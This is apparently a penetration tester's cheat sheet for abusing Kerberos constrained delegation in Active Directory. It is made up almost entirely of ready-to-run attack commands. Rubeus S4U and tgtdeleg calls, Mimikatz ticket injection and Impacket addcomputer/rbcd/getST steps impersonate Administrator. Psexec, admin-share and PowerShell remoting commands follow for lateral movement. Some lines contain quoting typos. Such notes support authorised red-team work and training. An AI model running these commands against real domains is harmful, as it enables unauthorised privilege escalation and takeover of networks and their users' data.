# Constrained Delegation

## Tools: Rubeus , rbcd.py , addcomputer.py , getST.py

### Object: msDS-AllowedToDelegateTo

### UACs TRUST_TO_AUTH_FOR_DELEGATION (With protocol transition (any)) / TRUSTED_FOR_DELEGATION (Without protocol transition (kerberos only))

# 1) Without protocol transition (kerberos only)  msDS-AllowedToDelegateTo TRUSTED_FOR_DELEGATION

Any service can be specified on the target since it is not correctly checked. All the Rubeus commands can be performed with kekeo aswell.

Windows

### 1) Request a ticket for multiple services on the target, for another user (S4U)

    .\Rubeus.exe s4u /user:user1 /rc4:<hash> /impersonateuser:Administrator /msdsspn:"time/<target>.domain.local" /altservice:ldap,cifs /ptt

### 2) If we have a session as the user, we can just run .\Rubeus.exe tgtdeleg /nowrap to get the TGT in Base64, then run:

    .\Rubeus.exe s4u /ticket:doIFCDC[SNIP]E9DQUw= /impersonateuser:Administrator /domain:domain.local /msdsspn:"time/<target>.domain.local" /altservice:ldap,cifs /ptt

### 3) Inject the ticket 

    Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'

Linux

    addcomputer.py -computer-name 'RBCD_COM$' -computer-pass 'RBCD_COM_PASSWORD' -dc-ip DC -DOMAIN/USER:PASSWORD' (RBCD)

    rbcd.py -delegate-from 'RBCD_COM$' -delegate-to 'CONSTRAINED$' -dc-ip -'DC' -action 'write' -hashes 'HASH DOMAIN/CONSTRAINED$ (For Self RBCD, Skip the 1st step entirely)

    getST.py -self -impersonate "administrator" -dc-ip IP DOMAIN/RBCD_COM$':'RBCD_COM_PASSWORD'

    getST.py -spn host/CONSTRAINED -hashes 'HASH' 'DOMAIN/COMPUTER_ACCOUNT' -impersonate Administrator --dc-ip DC_IP -additional-ticket PREVIOUS_TICKET

    getST.py -spn CONSTRAINED_SPN/TARGET -hashes 'HASH' 'DOMAIN/CONSTRAINED$' -impersonate Administrator --dc-ip DC_IP -additional-ticket PREVIOUS_TICKET

#### This technique gives a Kerberos TGS (Service ticket)

# 2) (With protocol transition (any)) msDS-AllowedToDelegateTo TRUST_TO_AUTH_FOR_DELEGATION

In this case, it is not possible to use S4U2self to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack.

    Rubeus hash /password:PASSWORD

## OR 

    Rubeus asktgt /user:USER /domain:DOMAIN /aes256:AES_256_HASH

    Rubeus s4u /ticket:TICKET /impersonateuser:ADMIN_USER /msdsspn:SPN_CONTRAINED /altservice:CIFS /ptt (Choose the altservice below to use with rubeus)

### Altservice:

#### 1) HOST

    psexec \\\TARGET CMD

#### 2) CIFS

    dir \\TARGET\c$

#### 3) HTTP

    Enter-Pssession -computername TARGET

## OR 

    Invoke-Command TARGET -Scriptblock {COMMAND}

#### 4) LDAP (No interactions)

### This attack gives a Kerberos TGS (Service Ticket)
